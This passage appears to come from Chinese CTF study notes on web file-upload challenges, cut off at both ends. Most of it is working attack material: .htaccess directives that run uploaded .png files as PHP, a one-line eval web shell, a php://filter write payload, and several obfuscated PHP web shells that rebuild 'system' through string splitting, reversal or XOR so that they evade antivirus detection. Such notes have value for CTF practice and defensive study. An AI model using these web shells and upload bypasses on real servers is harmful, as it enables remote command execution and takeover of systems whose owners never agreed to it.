&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PNG 二次渲染&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jpg 二次渲染&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传 &lt;code&gt;.htaccess&lt;/code&gt;  文件，将某类型文件作为 php 文件读取&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;AddType application/x-httpd-php .png&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;或者&lt;/p&gt;
&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;FilesMatch &#34;png&#34;&amp;gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SetHandler application/x-httpd-php &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight raw&#34;&gt;&lt;figcaption data-lang=&#34;&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&amp;lt;script language=&#39;php&#39;&amp;gt;eval($_POST[cmd]);&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xxxxxxxxxx1&amp;nbsp;1?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;web 167-170&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;s#y#s#t#e#m&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;#&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;1s&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;ystem&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strrev&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;metsys&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;更多的关于免杀&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;字符串拼接&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用异或，使用其他符号构建字符串 如&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;!&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#34;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;#&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;$&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;amp;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;\&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//ABCDEFG&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;  &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;(&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$b&lt;/span&gt;&lt;/span&gt;)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$d&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//abcdefg&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$e&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;`&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span 